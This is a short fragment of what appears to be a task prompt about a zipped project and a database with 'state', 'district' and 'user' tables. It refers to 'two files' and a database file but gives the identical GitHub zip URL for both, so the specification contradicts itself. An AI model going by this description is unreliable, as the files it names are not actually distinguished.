...
Given two files `https://raw.githubusercontent.com/vicky9696v/middlewhereFunctions/main/triatic/middlewhereFunctions.zip` and a database file `https://raw.githubusercontent.com/vicky9696v/middlewhereFunctions/main/triatic/middlewhereFunctions.zip` consisting of three tables `state`, `district` and `user`.
